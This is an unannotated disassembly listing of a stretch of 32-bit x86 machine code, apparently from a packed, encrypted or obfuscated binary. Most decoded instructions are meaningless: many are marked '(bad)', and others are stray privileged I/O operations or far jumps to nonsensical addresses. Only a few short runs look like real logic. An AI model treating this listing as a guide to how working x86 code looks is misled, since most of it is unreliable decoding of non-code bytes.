  407b5a:	popf   
  407b5b:	adc    DWORD PTR [ecx+ecx*4-0x61],edx
  407b5f:	stc    
  407b60:	add    al,0x5
  407b62:	loopne 0x407bce
  407b64:	sar    BYTE PTR [edi+0x32],1
  407b67:	fidivr DWORD PTR ds:0x235248f8
  407b6d:	pushf  
  407b6e:	shr    DWORD PTR [eax-0x6e],cl
  407b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b72:	mov    ds,WORD PTR [ecx-0x123b9bc5]
  407b78:	ds nop
  407b7a:	pushf  
  407b7b:	shl    BYTE PTR [eax-0x59],0x37
  407b7f:	adc    BYTE PTR [esi-0x36],dl
  407b82:	mov    ch,0xff
  407b84:	pushf  
  407b85:	shl    DWORD PTR [ecx],1
  407b87:	je     0x407bb8
  407b89:	cmp    al,0xbe
  407b8c:	test   DWORD PTR ds:0x8a76472e,0xb80b11db
  407b96:	(bad)  
  407b97:	sbb    ch,dh
  407b99:	in     eax,0xa5
  407b9b:	and    eax,0xa5f8bf75
  407ba0:	pop    edx
  407ba1:	dec    edx
  407ba2:	(bad)  
  407ba3:	out    dx,eax
  407ba4:	lock adc esi,DWORD PTR es:[eax+0x10]
  407ba9:	xchg   ebx,eax
  407baa:	inc    esp
  407bab:	sub    eax,0xb4c97e2
  407bb0:	fs jge 0x407c0f
  407bb3:	jb     0x407b46
  407bb5:	aas    
  407bb6:	das    
  407bb7:	push   es
  407bb8:	xchg   esi,eax
  407bb9:	mov    esp,0xb83c4ea6
  407bbe:	adc    ch,BYTE PTR [edi]
  407bc0:	push   0xd1c337f
  407bc5:	cmc    
  407bc6:	mov    eax,0x72cf3d48
  407bcb:	xchg   ebp,eax
  407bcc:	jbe    0x407b58
  407bce:	jmp    0x407bee
  407bd0:	sub    eax,0x447c1046
  407bd5:	fisub  WORD PTR fs:[ecx]
  407bd8:	mov    cs,WORD PTR [edi]
  407bda:	mov    eax,0xc5ec5f45
  407bdf:	int3   
  407be0:	adc    al,BYTE PTR [esp+eiz*4]
  407be3:	cmp    dh,BYTE PTR [edi-0x158bf034]
  407be9:	inc    DWORD PTR [ebp+0x42837133]
  407bef:	iret   
  407bf0:	rol    BYTE PTR [esi+ebp*4],cl
  407bf3:	push   ebx
  407bf4:	inc    esp
  407bf5:	jle    0x407bb8
  407bf7:	lods   ax,WORD PTR ds:[esi]
  407bf9:	in     al,dx
  407bfa:	dec    ecx
  407bfb:	loope  0x407bc7
  407bfd:	sub    al,0xe6
  407bff:	mov    cl,0x9
  407c01:	jae    0x407b96
  407c03:	leave  
  407c04:	hlt    
  407c05:	cs jne 0x407bb4
  407c08:	mov    ah,0x2b
  407c0a:	cmp    eax,0xa9facecb
  407c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c10:	push   ecx
  407c11:	dec    esp
  407c12:	inc    ebx
  407c13:	xchg   edi,eax
  407c14:	sbb    al,0x41
  407c16:	(bad)  
  407c17:	mov    ds,WORD PTR [ebx+esi*1-0x34170dce]
  407c1e:	mov    edx,0xdc476e53
  407c23:	jb     0x407c34
  407c25:	dec    edx
  407c26:	ins    DWORD PTR es:[edi],dx
  407c27:	cmp    BYTE PTR [edx],cl
  407c29:	rcl    DWORD PTR [edx+ecx*4],cl
  407c2c:	push   ds
  407c2d:	in     eax,dx
  407c2e:	mov    ds:0x49f2924a,al
  407c33:	add    dl,BYTE PTR [ecx+edx*2-0x43]
  407c37:	mov    al,0x6c
  407c39:	mov    BYTE PTR [edx],bl
  407c3b:	popa   
  407c3c:	push   eax
  407c3d:	fcom   st(7)
  407c3f:	fidivr WORD PTR [ebp-0x5c7801c5]
  407c45:	jmp    0x4a60c5c4
  407c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c4b:	jnp    0x407c2c
  407c4d:	sbb    eax,0x5bee38f7
  407c52:	mov    bl,0x8f
  407c54:	push   0xffffffc1
  407c56:	rcr    BYTE PTR [ecx-0x1d06d337],0xa1
  407c5d:	(bad)  
  407c5e:	test   eax,0x15658a6
  407c63:	xor    eax,0xca397e94
  407c68:	xor    bh,BYTE PTR [ecx]
  407c6a:	cmp    al,0x95
  407c6c:	and    bl,BYTE PTR [eax]
  407c6e:	jnp    0x407c48
  407c70:	mov    dl,0x37
  407c72:	mov    bl,0x69
  407c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c75:	int3   
  407c76:	ja     0x407c86
  407c78:	mov    al,ds:0x90906615
  407c7d:	sti    
  407c7e:	adc    eax,0x72418724
  407c83:	inc    eax
  407c84:	rcl    BYTE PTR [edi-0x78],1
  407c87:	cmp    eax,0xe7c371c6
  407c8c:	popa   
  407c8d:	fimul  WORD PTR [eax]
  407c8f:	inc    ebx
  407c90:	mov    cs,esi
  407c92:	(bad)  
  407c93:	pop    edi
  407c94:	in     al,dx
  407c95:	jecxz  0x407ce2
  407c97:	ret    
  407c98:	(bad)  
  407c99:	in     al,dx
  407c9a:	lock push eax
  407c9c:	cmp    ecx,eax
  407c9e:	or     edi,DWORD PTR [edx+0x18]
  407ca1:	out    dx,al
  407ca2:	es dec eax
  407ca4:	dec    eax
  407ca6:	sub    BYTE PTR [eax+0x141c45ee],ah
  407cac:	mov    dh,0xd7
  407cae:	dec    ecx
  407caf:	sbb    esi,DWORD PTR [esi]
  407cb1:	dec    esp
  407cb2:	push   edx
  407cb3:	popa   
  407cb4:	shl    BYTE PTR [ebp+0x60a2070e],1
  407cba:	jecxz  0x407c47
  407cbc:	inc    ebp
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	push   edx
  407ce0:	test   BYTE PTR [edx+0x7a],ch
  407ce3:	rol    edi,1
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407cda
  407cec:	jmp    0x1e327067
  407cf1:	ss pop edi
  407cf3:	add    BYTE PTR [esi],0x3a
  407cf6:	sub    eax,0xc1a38333
  407cfb:	stos   DWORD PTR es:[edi],eax
  407cfc:	add    DWORD PTR ds:0x480f496,0x6d9bf685
  407d06:	jl     0x407cc2
  407d08:	push   es
  407d09:	sbb    BYTE PTR [edi+0x6718d8ea],bh
  407d0f:	adc    ecx,esi
  407d11:	mov    ecx,0x2375b180
  407d16:	jecxz  0x407d5a
  407d18:	fiadd  DWORD PTR [ebp-0x4]
  407d1b:	or     BYTE PTR [edi-0x76],ah
  407d1e:	sub    al,0x67
  407d20:	fwait
  407d21:	(bad)  
  407d22:	cli    
  407d23:	rol    DWORD PTR [edx+0x39],1
  407d26:	mov    ds,WORD PTR [ebp+0x39]
  407d29:	cmp    bh,ch
  407d2b:	ret    0x72e1
  407d2e:	mov    ds:0x3414794c,eax
  407d33:	and    ecx,esi
  407d35:	(bad)  [ebx]
  407d37:	push   cs
  407d38:	xlat   BYTE PTR ds:[ebx]
  407d39:	xor    DWORD PTR [ebx],esi
  407d3b:	in     eax,0x34
  407d3d:	sbb    al,bh
  407d3f:	mov    ch,0xba
  407d41:	push   0xffffffa6
  407d43:	test   ecx,ebx
  407d45:	pop    ds
  407d46:	test   DWORD PTR [edx-0x59ba6ba0],edx
  407d4c:	fwait
  407d4d:	inc    edx
  407d4e:	ror    ah,1
  407d50:	push   ss
  407d51:	pop    esi
  407d52:	pop    edi
  407d53:	adc    al,dh
  407d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d56:	je     0x407d94
  407d58:	pop    ss
  407d59:	pop    ebx
  407d5a:	mov    cl,0x6
  407d5c:	cld    
  407d5d:	fadd   st,st(2)
  407d5f:	call   0xf4109170
  407d64:	push   0xfc87e8cd
  407d69:	rol    BYTE PTR [ecx],1
  407d6b:	sub    edx,edi
  407d6d:	sub    dh,BYTE PTR [ebx]
  407d6f:	fs popf 
  407d71:	cmp    bl,BYTE PTR [ecx-0x17]
  407d74:	push   edx
  407d75:	retf   0xfc0e
  407d78:	push   0xffffff98
  407d7a:	mov    WORD PTR [edi+0x4d],ss
  407d7d:	mov    cl,0xd
  407d7f:	and    BYTE PTR [edx+0x31],bl
  407d82:	mov    WORD PTR [ebx],?
  407d84:	pop    ss
  407d85:	push   ebx
  407d86:	xchg   ecx,eax
  407d87:	fdiv   QWORD PTR [ebx]
  407d89:	lods   al,BYTE PTR ds:[esi]
  407d8a:	ror    BYTE PTR [esi+0x761ecfaf],cl
  407d90:	push   ecx
  407d91:	cmp    BYTE PTR [eax],al
  407d93:	pop    ds
  407d94:	rcr    BYTE PTR [esi+0x12],0x42
  407d98:	jmp    0xa421:0x4a6dba98
  407d9f:	adc    cl,BYTE PTR [edi+0x71d56248]
  407da5:	add    DWORD PTR [edi],esi
  407da7:	xchg   edi,eax
  407da8:	outs   dx,BYTE PTR ds:[esi]
  407da9:	xor    ecx,esp
  407dab:	sub    BYTE PTR [edx],cl
  407dad:	data16 jnp 0x407e08
  407db0:	scas   al,BYTE PTR es:[edi]
  407db1:	sub    BYTE PTR [ebp+0x28],dl
  407db4:	pop    ebp
  407db5:	add    al,0x91
  407db7:	cmp    ebx,ebx
  407db9:	dec    esi
  407dba:	jge    0x407dc9
  407dbc:	xor    al,0x9c
  407dbe:	cmp    eax,ebx
  407dc0:	mov    ds:0xc6f26b62,al
  407dc5:	call   0x17a44f1f
  407dca:	retf   0xd05e
  407dcd:	hlt    
  407dce:	push   cs
  407dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dd0:	jmp    0x9f99c2c
  407dd5:	fdiv   QWORD PTR [eax-0x7]
  407dd8:	cwde   
  407dd9:	push   ebx
  407dda:	(bad)  
  407ddc:	imul   esp,DWORD PTR [edx],0xfffffffd
  407ddf:	add    ch,cl
  407de1:	fucomi st,st(5)
  407de3:	(bad)  
  407de4:	adc    edi,edi
  407de6:	inc    ecx
  407de7:	add    DWORD PTR [edx+0x29],ecx
  407dea:	mov    bh,0xb3
  407dec:	es aas 
  407dee:	icebp  
  407def:	xor    al,0x24
  407df1:	xor    al,0x40
  407df3:	dec    ebx
  407df4:	xlat   BYTE PTR ds:[ebx]
  407df5:	pushf  
  407df6:	into   
  407df7:	push   ebp
  407df8:	sub    BYTE PTR [edx],bl
  407dfa:	mov    eax,0xb8f296ec
  407dff:	mov    ecx,0xee38f429
  407e04:	ds or  eax,0xf0c9fe79
  407e0a:	cli    
  407e0b:	cs add eax,0xe5a27503
  407e11:	xor    DWORD PTR [edi-0x77],edi
  407e14:	fild   WORD PTR [ebp+edx*1+0x288fc46]
  407e1b:	dec    ebp
  407e1c:	push   ebx
  407e1d:	clc    
  407e1e:	hlt    
  407e1f:	nop
  407e20:	push   edi
  407e21:	mov    ah,0xa6
  407e23:	leave  
  407e24:	je     0x407e68
  407e26:	in     eax,dx
  407e27:	fidivr WORD PTR [ebx+edx*8]
  407e2a:	jecxz  0x407dfb
  407e2c:	daa    
  407e2d:	mov    edx,0xbd160255
  407e32:	lock fiadd WORD PTR [esi]
  407e35:	dec    ebx
  407e36:	pushf  
  407e37:	mov    bl,0x8d
  407e39:	fisub  DWORD PTR [edi+0x26]
  407e3c:	mov    ch,0x63
  407e3e:	ins    BYTE PTR es:[edi],dx
  407e3f:	jmp    0x407ea1
  407e41:	lea    edx,[eax]
  407e43:	or     ch,bh
  407e45:	mov    al,0xac
  407e47:	(bad)  
  407e48:	xor    BYTE PTR ds:[ebp+eiz*2+0x4],bl
  407e4d:	push   0x8458969
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0xe9
  407ea7:	or     eax,0xd8b57eb8
  407eac:	jle    0x407f2c
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407e94
  407eb3:	lds    ebx,FWORD PTR [ebp+0x61cc0717]
  407eb9:	pop    DWORD PTR [edx+0x6]
  407ebc:	inc    esp
  407ebd:	ficomp DWORD PTR [ebp+esi*2-0x79640e79]
  407ec4:	push   ss
  407ec5:	inc    eax
  407ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ec7:	cld    
  407ec8:	pop    esp
  407ec9:	jns    0x407f28
  407ecb:	cmp    BYTE PTR [esi+0x13e8b76],bl
  407ed1:	xor    al,al
  407ed3:	or     eax,esp
  407ed5:	retf   
  407ed6:	retf   0xd3a1
  407ed9:	aam    0xae
  407edb:	ficomp DWORD PTR [ebp+0x44]
  407ede:	lock fwait
  407ee0:	cmp    cl,cl
  407ee2:	sbb    BYTE PTR [ebp+0x3700186a],bl
  407ee8:	jns    0x407ee4
  407eea:	mov    WORD PTR [edx+0x54],cs
  407eed:	in     al,0x72
  407eef:	fisub  DWORD PTR [ecx-0xf]
  407ef2:	sub    DWORD PTR [eax+0x52fa6133],ebp
  407ef8:	inc    esp
  407ef9:	cmp    bh,dl
  407efb:	scas   eax,DWORD PTR es:[edi]
  407efc:	iret   
  407efd:	or     al,0x97
  407eff:	mov    cl,0x2f
  407f01:	sahf   
  407f02:	mov    dl,bh
  407f04:	adc    dl,BYTE PTR [eax]
  407f06:	in     eax,0x27
  407f08:	(bad)  
  407f0a:	push   0x720895bc
  407f0f:	pop    ecx
  407f10:	imul   eax,DWORD PTR [edi],0xffffffee
  407f13:	mov    esi,0x16044e4b
  407f18:	mov    dh,0x78
  407f1a:	sbb    BYTE PTR [ebp+0x6713c840],bl
  407f20:	stos   DWORD PTR es:[edi],eax
  407f21:	cmp    al,0xbf
  407f23:	sbb    esi,ecx
  407f25:	mov    eax,ds:0x7c8dc780
  407f2a:	or     al,0x3b
  407f2c:	xchg   esi,eax
  407f2d:	mov    ecx,0x5ad35e05
  407f32:	or     BYTE PTR [edx-0x6dca4d5a],bh
  407f38:	ins    BYTE PTR es:[edi],dx
  407f39:	ret    
  407f3a:	into   
  407f3b:	jnp    0x407f52
  407f3d:	jno    0x407f28
  407f3f:	(bad)  
  407f40:	push   cs
  407f41:	adc    DWORD PTR [eax+0x15e28a6d],eax
  407f47:	pop    eax
  407f48:	mov    ecx,ss
  407f4a:	pop    ecx
  407f4b:	add    eax,0xe598c8df
  407f50:	rcl    DWORD PTR [ecx],1
  407f52:	daa    
  407f53:	inc    edx
  407f54:	or     dl,dh
  407f56:	push   0xffffff84
  407f58:	add    al,0xc7
  407f5a:	out    dx,eax
  407f5b:	lock lods eax,DWORD PTR ds:[esi]
  407f5d:	fxch   st(6)
  407f5f:	seto   BYTE PTR [esi]
  407f62:	mov    ds:0x45ae2b13,al
  407f67:	(bad)  
  407f68:	(bad)  
  407f69:	idiv   DWORD PTR gs:[ebx+0x7d]
  407f6d:	in     eax,0x10
  407f6f:	(bad)  
  407f70:	pop    edi
  407f71:	pusha  
  407f72:	test   al,0xb4
  407f74:	mov    dl,BYTE PTR ds:0xa1a94752
  407f7a:	jae    0x407ff1
  407f7c:	(bad)  
  407f7d:	hlt    
  407f7e:	dec    ecx
  407f7f:	test   BYTE PTR [edi-0x28],0x6f
  407f83:	inc    ecx
  407f84:	or     al,0x1b
  407f86:	fwait
  407f87:	sbb    al,BYTE PTR [ecx-0x5fd9aaed]
  407f8d:	and    dl,0x2a
  407f90:	jne    0x407ffd
  407f92:	ficom  DWORD PTR [edi-0x5f]
  407f95:	push   0x2b3e3071
  407f9a:	dec    esi
  407f9b:	add    DWORD PTR [edx+0x12d1d150],0x76acbe5c
  407fa5:	test   DWORD PTR ds:0x3ae700ae,esp
  407fab:	dec    ecx
  407fac:	cmp    edi,DWORD PTR [edx]
  407fae:	or     bh,BYTE PTR [eax+0x53c33d6e]
  407fb4:	pop    ss
  407fb5:	fistp  WORD PTR [eax+0x77]
  407fb8:	mov    ds:0xd338621a,eax
  407fbd:	pop    ecx
  407fbe:	ins    BYTE PTR es:[edi],dx
  407fbf:	add    esp,DWORD PTR [eax-0x5]
  407fc2:	push   es
  407fc3:	or     al,0x3
  407fc5:	mov    esi,0xf9d539e7
  407fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fcb:	push   es
  407fcc:	cwde   
  407fcd:	nop
  407fce:	daa    
  407fcf:	xchg   dl,bh
  407fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fd2:	(bad)  
  407fd3:	fnstsw WORD PTR [edx]
  407fd5:	(bad)
  407fd8:	stos   BYTE PTR es:[edi],al
  407fd9:	mov    dh,0x1b
  407fdb:	mov    eax,ds:0x5e46e6f8
  407fe0:	mov    eax,ds:0xb1e927da
  407fe5:	sub    BYTE PTR [ebp+0x45],dl
  407fe8:	xor    DWORD PTR [esi-0x3539a41a],eax
  407fee:	popa   
  407fef:	dec    esi
  407ff0:	xor    BYTE PTR [esp+ebx*8+0x157e52af],al
  407ff7:	clc    
  407ff8:	push   es
  407ff9:	add    al,0x2a
  407ffb:	ja     0xeb06fa53
  408001:	aad    0x36
  408003:	fnsave [eax+0x3a]
  408006:	shl    WORD PTR [esi-0x25],cl
  40800a:	mov    ebx,0x13774b3
  40800f:	dec    esi
  408010:	ds nop
  408012:	inc    eax
  408013:	scas   al,BYTE PTR es:[edi]
  408014:	pop    edx
  408015:	cwde   
  408016:	mov    DWORD PTR [ebp-0x14],eax
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx-0x5859f895],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x408021
  408040:	stc    
  408041:	test   DWORD PTR [eax],ecx
  408043:	pop    ds
  408044:	ss xbegin 0xb3c07489
  40804b:	mov    BYTE PTR [ebx-0x2fb4955],ah
  408051:	dec    ecx
  408052:	js     0x408086
  408054:	jb     0x40808d
  408056:	addr16 hlt 
  408058:	or     al,0x20
  40805a:	into   
  40805b:	sub    BYTE PTR [esi-0xd],cl
  40805e:	ficomp DWORD PTR ds:[esp+ecx*4]
  408062:	dec    esi
  408063:	leave  
  408064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408065:	xchg   esi,eax
  408066:	pop    ss
  408067:	ja     0x40802f
  408069:	or     bh,al
  40806b:	mov    ebx,0x3a3a85c0
  408070:	fld    TBYTE PTR [ebx+0x2e]
  408073:	push   edi
  408074:	arpl   WORD PTR [esi],dx
  408076:	in     eax,0x40
  408078:	adc    al,0x55
  40807a:	clc    
  40807b:	mov    cl,0xfa
  40807d:	lds    ebx,FWORD PTR [edi-0x32]
  408080:	xchg   BYTE PTR [ebp-0x6f],ch
  408083:	and    eax,0x4e6bb707
  408088:	les    esi,FWORD PTR [ecx-0x40578286]
  40808e:	aad    0xe1
  408090:	pusha  
  408091:	ins    BYTE PTR es:[edi],dx
  408092:	ja     0x40802a
  408094:	adc    al,0x2b
  408096:	adc    ch,BYTE PTR [esi+0x3b5ee592]
  40809c:	push   eax
  40809d:	test   DWORD PTR [esi],0x9afffb1f
  4080a3:	test   DWORD PTR [eax+ecx*4],edi
  4080a6:	inc    ebx
  4080a7:	lds    edx,FWORD PTR [eax-0x4aeff1f5]
  4080ad:	int3   
  4080ae:	lods   al,BYTE PTR ds:[esi]
  4080af:	mov    BYTE PTR [eax+0x7de62a2f],bl
  4080b5:	sbb    edi,DWORD PTR [edi-0xf]
  4080b8:	loope  0x408045
  4080ba:	pop    eax
  4080bb:	push   ss
  4080bc:	outs   dx,BYTE PTR ds:[esi]
  4080bd:	pop    ebp
  4080be:	push   ebp
  4080bf:	push   ebp
  4080c0:	add    DWORD PTR [ebp-0x66],ebx
  4080c3:	retf   0x6839
  4080c6:	fcmovnb st,st(1)
  4080c8:	jmp    0x408058
  4080ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080cb:	xlat   BYTE PTR ds:[ebx]
  4080cc:	cmp    DWORD PTR [esi+0x6d0c7e9b],eax
  4080d2:	xchg   DWORD PTR [edi-0x698c9e09],edx
  4080d8:	add    eax,0x89d9ea3e
  4080dd:	ins    BYTE PTR es:[edi],dx
  4080de:	les    esp,FWORD PTR ds:0x99fb006b
  4080e4:	add    edx,ebp
  4080e6:	fimul  WORD PTR [ebp-0x593fce00]
  4080ec:	jl     0x4080a2
  4080ee:	jno    0x4080ad
  4080f0:	xchg   esi,eax
  4080f1:	fld    st(3)
  4080f3:	fdivr  st,st(7)
  4080f5:	jmp    0x40810d
  4080f7:	ins    DWORD PTR es:[edi],dx
  4080f8:	inc    esp
  4080f9:	push   ds
  4080fa:	xor    cl,BYTE PTR [esi+edi*2]
  4080fd:	dec    esp
  4080fe:	fwait
  4080ff:	pop    ds
  408100:	jmp    0x62c7:0xa0969117
  408107:	shl    BYTE PTR [ebx+0x79],0xc0
  40810b:	ins    DWORD PTR es:[edi],dx
  40810c:	pop    es
  40810d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40810e:	out    dx,al
  40810f:	pop    ecx
  408110:	retf   0x741e
  408113:	outs   dx,BYTE PTR ds:[esi]
  408114:	in     al,0x53
  408116:	jae    0x40815e
  408118:	scas   al,BYTE PTR es:[edi]
  408119:	call   0x6617:0x8a32e204
  408120:	add    al,0xf1
  408122:	push   es
  408123:	shr    DWORD PTR [edi+0x72],cl
  408126:	(bad)  
  408127:	mov    edi,0x9d7019da
  40812c:	xor    bl,BYTE PTR [eax-0x21]
  40812f:	xchg   ebx,eax
  408130:	dec    edx
  408131:	mov    edi,0xb986afd3
  408136:	jmp    0x408151
  408138:	test   BYTE PTR [edx+0x4b9df4ca],cl
  40813e:	outs   dx,DWORD PTR ds:[esi]
  40813f:	sub    BYTE PTR [ebp+0x4d],al
  408142:	hlt    
  408143:	mov    dl,0x9b
  408145:	es pop ebx
  408147:	mov    BYTE PTR [edx],cl
  408149:	div    cl
  40814b:	sti    
  40814c:	sub    BYTE PTR [ecx+0x5],cl
  40814f:	nop
  408150:	xor    dh,BYTE PTR [edi+0x4e]
  408153:	jae    0x408147
  408155:	push   ecx
  408156:	pop    ds
  408157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408158:	jl     0x40815f
  40815a:	or     BYTE PTR [ebx],ah
  40815c:	and    al,0x29
  40815e:	dec    ebx
  40815f:	jmp    0xa206:0x4e2b94c9
  408166:	in     al,dx
  408167:	cli    
  408168:	push   ebx
  408169:	std    
  40816a:	sub    eax,0xc905b09f
  40816f:	cmp    DWORD PTR [eax-0x81c5c03],0x58b53a9b
  408179:	cwde   
  40817a:	inc    ebx
  40817b:	pop    ss
  40817c:	xor    BYTE PTR [eax],cl
  40817e:	xor    BYTE PTR [eax-0x1f],cl
  408181:	int    0x70
  408183:	es mov edi,ecx
  408186:	xchg   edi,eax
  408187:	(bad)  [ecx+0x25]
  40818a:	push   es
  40818b:	test   esi,0x3a96117b
  408191:	and    al,0x35
  408193:	retf   
  408194:	add    eax,0x99d47425
  408199:	aas    
  40819a:	pop    edi
  40819b:	jbe    0x4081ad
  40819d:	cmp    DWORD PTR [edx+0x1558ac04],ebx
  4081a3:	mov    eax,DWORD PTR [ebp-0x10]
  4081a6:	mov    edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0xf35b071]
  4081bf:	sub    DWORD PTR [ebp-0x2d818125],ecx
  4081c5:	jg     0x408245
  4081c7:	jle    0x408248
  4081c9:	inc    esp
  4081ca:	sub    al,0xbb
  4081cc:	sbb    ebx,DWORD PTR [edi-0x23048a84]
  4081d2:	lods   al,BYTE PTR ds:[esi]
  4081d3:	mov    esi,DWORD PTR [edi]
  4081d5:	retf   0x1ed0
  4081d8:	mov    eax,ds:0x5ff96b6b
  4081dd:	in     eax,dx
  4081de:	sbb    eax,0xa5226ac
  4081e3:	inc    esp
  4081e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081e5:	sti    
  4081e6:	aam    0xe9
  4081e8:	xlat   BYTE PTR ds:[ebx]
  4081e9:	jl     0x40817e
  4081eb:	mov    ah,dl
  4081ed:	out    0xc0,eax
  4081ef:	(bad)  
  4081f0:	call   0x5ee456fc
  4081f5:	div    DWORD PTR [esi+0x4c]
  4081f8:	adc    DWORD PTR [edx+0x719f2c8b],edi
  4081fe:	shl    dh,0x5e
  408201:	jmp    0x6cda:0xd5b6caa9
  408208:	xor    ebx,DWORD PTR [edx-0x51c5f41]
  40820e:	pop    esp
  40820f:	in     al,0x10
  408211:	mov    ebp,0x2beddc25
  408216:	pop    esi
  408217:	pop    ss
  408218:	xchg   ebp,eax
  408219:	pop    esp
  40821a:	ins    DWORD PTR es:[edi],dx
  40821b:	imul   eax,edi,0xf0b53b4c
  408221:	in     al,0x44
  408223:	leave  
  408224:	xor    DWORD PTR [ecx-0x15],0x46e87ff1
  40822b:	push   ecx
  40822c:	dec    edi
  40822d:	call   0x616acc0d
  408232:	sbb    BYTE PTR ds:0xc1737e08,cl
  408238:	(bad)
  40823b:	sub    eax,0xf5d5eccf
  408240:	aaa    
  408241:	clc    
  408242:	(bad)  
  408243:	cwde   
  408244:	mov    es,WORD PTR [ebp+0x443ebd91]
  40824a:	imul   edx,DWORD PTR [edi-0x3fe70a38],0xfffffffd
  408251:	rcr    dh,1
  408253:	or     BYTE PTR [esi+0x39],ch
  408256:	das    
  408257:	or     dh,BYTE PTR ds:0x4293e687
  40825d:	inc    edx
  40825e:	dec    ecx
  40825f:	pop    ebp
  408260:	xor    dh,dh
  408262:	test   cl,al
  408264:	pop    edx
  408265:	lods   eax,DWORD PTR ds:[esi]
  408266:	and    edi,DWORD PTR [ecx]
  408268:	shr    bh,cl
  40826a:	call   0xfa6bd085
  40826f:	push   0x538a5b60
  408274:	mov    bl,0x90
  408276:	cmp    al,0x83
  408278:	in     eax,0xa1
  40827a:	jb     0x40829c
  40827c:	adc    al,0xfb
  40827e:	les    esi,FWORD PTR [eax+0x5]
  408281:	pushf  
  408282:	out    dx,eax
  408283:	dec    edi
  408284:	loope  0x408241
  408286:	sahf   
  408287:	jmp    0x5f8784db
  40828c:	aaa    
  40828d:	fldenv [edi]
  40828f:	iret   
  408290:	in     eax,0x1f
  408292:	std    
  408293:	push   eax
  408294:	sbb    eax,0x77336b33
  408299:	jp     0x40829b
  40829b:	dec    dx
  40829d:	or     DWORD PTR [esp+eax*8-0x6f],edi
  4082a1:	xor    BYTE PTR [eax-0x8],ch
  4082a4:	faddp  st(6),st
  4082a6:	mov    cl,0x63
  4082a8:	fwait
  4082a9:	mov    eax,ds:0xf0271d36
  4082ae:	xor    BYTE PTR [esi-0x59ddb8a2],al
  4082b4:	cmp    ah,BYTE PTR [eax+0x1b]
  4082b7:	add    cl,bl
  4082b9:	inc    esi
  4082ba:	mov    eax,0xf2c54672
  4082bf:	aam    0x6d
  4082c1:	cld    
  4082c2:	or     al,0x14
  4082c4:	push   esi
  4082c5:	outs   dx,BYTE PTR ds:[esi]
  4082c6:	mov    ah,0x6
  4082c8:	or     DWORD PTR [edx+ebx*1],ebx
  4082cb:	int3   
  4082cc:	mov    edx,0x12bf846
  4082d1:	add    al,0xc5
  4082d3:	sub    BYTE PTR [ebx+eiz*2-0x4c904a67],bh
  4082da:	xchg   ecx,eax
  4082db:	inc    edi
  4082dc:	push   es
  4082dd:	sbb    cl,0x3d
  4082e0:	cmc    
  4082e1:	and    esi,DWORD PTR [esp+esi*2-0x53a9ba98]
  4082e8:	dec    edx
  4082e9:	dec    ebp
  4082ea:	call   0xfc5eab4d
  4082ef:	or     eax,0xcef72ce1
  4082f4:	mov    al,0x87
  4082f6:	retf   0x14b3
  4082f9:	cmc    
  4082fa:	ins    BYTE PTR es:[edi],dx
  4082fb:	stos   DWORD PTR es:[edi],eax
  4082fc:	dec    esi
  4082fd:	xchg   edi,eax
  4082fe:	xor    al,0xd0
  408300:	mov    esp,0xcdd0386f
  408305:	test   DWORD PTR cs:[ebx+esi*1-0x5b98e52e],esp
  40830d:	fimul  DWORD PTR [esi]
